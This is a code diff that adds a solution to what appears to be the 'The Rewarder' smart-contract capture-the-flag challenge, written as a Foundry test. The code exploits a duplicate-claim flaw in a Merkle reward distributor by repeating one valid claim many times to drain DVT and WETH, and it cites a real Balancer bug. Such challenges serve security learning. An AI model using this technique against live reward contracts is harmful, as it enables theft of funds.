@@ -148,7 +148,62 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+
+        // There is a critical vul once you notice that the following check can be circumvinted :
+        //    if (token != inputTokens[inputClaim.tokenIndex]) {
+            // if (address(token) != address(0)) {
+            //     if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+            // }  
+        // By stacking claims on a type of tokens at a time which will result in token and inputTokens[inputClaim.tokenIndex] to be always equal.
+        // Issue found in Immunefi. More details : https://medium.com/balancer-protocol/logic-error-bug-fix-review-da37f0cc9a08
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        dvtRoot = merkle.getRoot(dvtLeaves);
+        wethRoot = merkle.getRoot(wethLeaves);
+
+        assertEq(player, 0x44E97aF4418b7a17AABD8090bEA0A471a366305C); // index 188                            
+
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;                    
+        uint256 lengthDVT = (TOTAL_DVT_DISTRIBUTION_AMOUNT - PLAYER_DVT_CLAIM_AMOUNT) / PLAYER_DVT_CLAIM_AMOUNT;
+        // Create Alice's claims
+        Claim[] memory claimsDVT = new Claim[](lengthDVT);
+        IERC20[] memory tokensToClaimDVT = new IERC20[](lengthDVT);
+
+        uint256 i;
+        while (i < lengthDVT) {
+            claimsDVT[i] = Claim({
+                batchNumber: 0, 
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0, 
+                proof: merkle.getProof(dvtLeaves, 188) // Player's address is at index 188
+            });
+            tokensToClaimDVT[i] = IERC20(address(dvt));
+            i = i + 1;
+        }
+        distributor.claimRewards({inputClaims: claimsDVT, inputTokens: tokensToClaimDVT});
+
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340; 
+        uint256 lengthWETH = (TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT) / PLAYER_WETH_CLAIM_AMOUNT;
+        // Create Alice's claims
+        Claim[] memory claimsWETH= new Claim[](lengthWETH);
+        IERC20[] memory tokensToClaimWETH = new IERC20[](lengthWETH);
+
+        uint256 j;
+        while (j < lengthWETH) {
+            claimsWETH[j] = Claim({
+                batchNumber: 0, 
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1, 
+                proof: merkle.getProof(wethLeaves, 188) // Player's address is at index 188
+            });
+            tokensToClaimWETH[j] = IERC20(address(weth));
+            j = j + 1;
+        }
+        distributor.claimRewards({inputClaims: claimsWETH, inputTokens: tokensToClaimWETH});
+
+        weth.transfer(address(recovery), weth.balanceOf(player));
+        dvt.transfer(address(recovery), dvt.balanceOf(player));
     }
 
     /**
